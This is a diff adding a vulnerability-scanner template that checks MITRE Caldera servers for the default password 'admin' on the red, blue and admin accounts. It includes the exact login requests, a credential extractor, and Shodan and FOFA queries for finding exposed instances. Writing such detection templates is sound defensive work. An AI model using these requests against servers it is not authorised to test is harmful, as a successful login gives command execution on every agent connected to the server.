@@ -1,0 +1,70 @@
+id: caldera-default-login
+
+info:
+  name: MITRE Caldera - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    MITRE Caldera was found using default credentials. When started with the insecure default configuration, both the v4 (classic) and v5 (Magma) consoles ship static operator accounts (red, blue and admin) that all authenticate with the password "admin". An attacker who logs in gains full control of the adversary-emulation server and can run operations that execute commands on every connected agent.
+  impact: |
+    An attacker with default credentials gains full operator access to the Caldera server, enabling them to launch adversary-emulation operations and execute arbitrary commands on all connected agents.
+  remediation: |
+    Change all default credentials immediately and configure unique, strong passwords for each operator account.
+  reference:
+    - https://github.com/mitre/caldera
+    - https://caldera.readthedocs.io/en/latest/Server-Configuration.html
+  classification:
+    cwe-id: CWE-798
+  metadata:
+    verified: true
+    max-request: 4
+    vendor: mitre
+    product: caldera
+    shodan-query: http.title:"Caldera"
+    fofa-query: title="Caldera"
+  tags: caldera,mitre,default-login,auth,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'regex("(?i)caldera", body)'
+        internal: true
+
+  - raw:
+      - |
+        POST /enter HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - red
+        - blue
+        - admin
+      password:
+        - admin
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header, "API_SESSION=")'
+          - 'status_code == 302'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
+# digest: 4a0a00473045022100dcb49a4a20039401031f9bfaa3a7cc8508fbeb6794bcd9fa5e27aeb86ac9c0d0022040d20371a581d6e809761161dec0af307a02bcaa8c2da17b7ec3fe4cbc1529a7:922c64590222798bb761d5b6d8e72950
